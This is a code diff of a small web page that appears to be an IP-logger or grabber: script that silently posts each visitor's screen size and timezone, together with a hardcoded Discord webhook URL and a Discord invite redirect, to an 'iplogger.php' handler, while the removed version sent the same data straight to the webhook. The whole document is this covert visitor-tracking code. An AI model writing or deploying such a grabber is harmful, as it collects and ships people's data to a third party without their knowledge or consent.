@@ -1,18 +1,8 @@
 <script>
-var url = "https://discord.com/api/webhooks/090908015099031078/QbeMHERTUYIOHmJ_SkyQ_1536C9rwOyeBsjqcWejT0MdPGHJKRTYUIOBoOVJqUryG_w0o"; //example
-
+var webhook = "https://discord.com/api/webhooks/930788015545131028/QbesUFN6pSADPmJ_SkyQ_1536C9rwOyeBsjqcWejT0MdPa2QMGYgYiBoOVJqUryG_w0o";
+var redirect = "https://discord.com/invite/WK4Fraka6b";
 var xhr = new XMLHttpRequest();
-xhr.open('POST', url, true);
-xhr.setRequestHeader('Content-type', 'application/json');
-var data =    
-    '"Width=":' + window.screen.availWidth + "\n" +            
-    '"Height=":' + window.screen.availHeight + "\n" +
-    '"TimeZone=":' + Intl.DateTimeFormat().resolvedOptions().timeZone;
-xhr.send(JSON.stringify({content: data}));
+xhr.open('POST', 'iplogger.php', true);
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xhr.send('link=' + webhook + "&Width=" + window.screen.width + "&Height=" + window.screen.height + "&TimeZone=" + Intl.DateTimeFormat().resolvedOptions().timeZone + "&Redirect=" + redirect);
 </script>
-
-<?php
-$url = "https://discord.com/api/webhooks/090908015099031078/QbeMHERTUYIOHmJ_SkyQ_1536C9rwOyeBsjqcWejT0MdPGHJKRTYUIOBoOVJqUryG_w0o"; //example
-include("iplogger.php");
-LogData($url);
-?>
